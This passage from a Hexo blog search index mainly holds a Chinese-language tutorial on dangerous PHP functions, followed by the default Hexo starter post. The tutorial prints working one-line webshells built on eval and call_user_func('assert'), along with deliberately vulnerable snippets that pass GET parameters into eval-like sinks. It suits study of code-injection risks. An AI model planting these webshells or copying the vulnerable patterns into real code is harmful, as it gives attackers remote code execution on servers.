        <content type="html"><![CDATA[<h2 id="php危险函数总结"><a href="#php危险函数总结" class="headerlink" title="php危险函数总结"></a>php危险函数总结</h2><h5 id="什么是危险函数"><a href="#什么是危险函数" class="headerlink" title="什么是危险函数"></a>什么是危险函数</h5><p>函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。</p><pre><code>$_GET            $POST$_fILES$_COOKIE$_REQUEST        $_SERVER        $_SESSION    </code></pre><h4 id="执行任意代码的函数"><a href="#执行任意代码的函数" class="headerlink" title="执行任意代码的函数"></a>执行任意代码的函数</h4><ul><li>eval函数</li><li>assert函数</li><li>create_function 函数</li><li>preg_replace 函数</li><li>call_user_func/call_user_func_array函数</li><li>array_map函数</li><li>array_filter函数</li><li>usort/uasort函数</li><li>$a($b)动态函数</li></ul><h5 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h5><p>eval() 函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p><p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p><pre><code>&lt;?php$string = &quot;beautiful&quot;;$time = &quot;winter&quot;;$str = &#39;This is a $string $time morning!&#39;;eval(&quot;\$str = \&quot;$str\&quot;;&quot;);echo $str;输出为：This is a beautiful winter morning! </code></pre><p><strong>简单的一句话木马：</strong><?php eval($_POST['CMD']);?></p><h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>assert——检测一个 断言是否为FALSE</p><p>如果参数为字符串，它将会被assert()当做php代码来执行</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">function</span> fo<span class="token punctuation">{</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php phpinfo() ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"$func()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>如果我们提交?func=fo，即可写入shell.php</p><h5 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h5><p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p><p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token string">'echo'</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">'"test"'</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a'</span><span class="token punctuation">,</span> <span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CPictures%5CQQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p><h5 id="代码执行漏洞常见种类"><a href="#代码执行漏洞常见种类" class="headerlink" title="代码执行漏洞常见种类"></a>代码执行漏洞常见种类</h5><ul><li><strong>create_function函数</strong></li></ul><p>create_function(string $args, string $code)</p><p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p><p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p><pre><code>&lt;?php$id=$_GET[&#39;id&#39;];$str2=&#39;echo&#39;.$a.&#39;&quot;test&quot;&#39;.$id.&quot;;&quot;;$f1 = create_function(&#39;$a&#39;, $str2);$f1(&quot;abc&quot;);?&gt;</code></pre><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CPictures%5CQQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p><ul><li><strong>preg_replace函数</strong></li></ul><p>preg_replace($pattern,$replacement,$subject,$limit,$count)</p><p>示例1：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/test/e"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"this is a test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>当我们所要匹配的字符串中含有test时</p><p>我们直接传入参数？a=phpinfo()即可执行代码。</p><p>示例2：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span><span class="token punctuation">,</span> <span class="token string">'test("\1")'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CPictures%5CQQ%E6%88%AA%E5%9B%BE20200218125837.png" alt=""></p><ul><li><strong>call_user_func/call_user_func_array函数</strong></li></ul><p>call_user_func($callback,$parameter)</p><p>调用一个回调函数处理字符串,</p><p>call_user_func_array($callback,$param arr)</p><p>利用回调函数处理数组。</p><p><strong>示例1：</strong></p><img src="C:\Users\尚慧亮\Pictures\QQ截图20200218130741.png" style="zoom:80%;" /><img src="C:\Users\尚慧亮\Pictures\QQ截图20200218130753.png" style="zoom:67%;" /><p><strong>示例2：</strong></p><p>一句话木马：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>@<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CPictures%5CQQ%E6%88%AA%E5%9B%BE20200218131820.png" alt=""></p><ul><li>array_map函数</li></ul><p>array_map（$callback,$array1)</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre> <img src="C:\Users\尚慧亮\Pictures\QQ截图20200218133234.png" style="zoom: 67%;" /><ul><li><strong>array_filter函数</strong></li></ul><p>array_filter($array,$callback)</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><img src="C:\Users\尚慧亮\Pictures\QQ截图20200218202542.png" style="zoom:67%;" /><ul><li><p><strong>usort/uasort函数</strong></p><p>usort(array, cmp_function)；</p><p>uasort(array, cmp_function)；</p></li><li><p><strong>$a$b动态函数</strong></p></li></ul><h4 id="读取网络资源的函数"><a href="#读取网络资源的函数" class="headerlink" title="读取网络资源的函数"></a>读取网络资源的函数</h4><p>常见的php读取远程文件的方式</p><ul><li><p><strong>Fopen()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$handle</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.baidu.com","rb");</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$contents</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$contents</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre></li></ul><ul><li><strong>file_get_content()</strong></li></ul><ul><li><strong>curl</strong></li></ul><h4 id="操作文件的函数"><a href="#操作文件的函数" class="headerlink" title="操作文件的函数"></a>操作文件的函数</h4><p>常见文件操作函数</p><ul><li><strong>Copy()</strong></li><li><strong>File_get_contents()/File_put_contents</strong></li><li><strong>File()</strong></li><li><strong>Fopen()</strong></li><li><strong>Move_uploaded_file()</strong></li><li><strong>Readfile()</strong></li><li><strong>Rename()</strong></li><li><strong>Rmdir()</strong></li><li><strong>Unlink()</strong></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>article title</title>
      <link href="/2020/03/02/article-title/"/>
      <url>/2020/03/02/article-title/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/03/02/hello-world/"/>
      <url>/2020/03/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
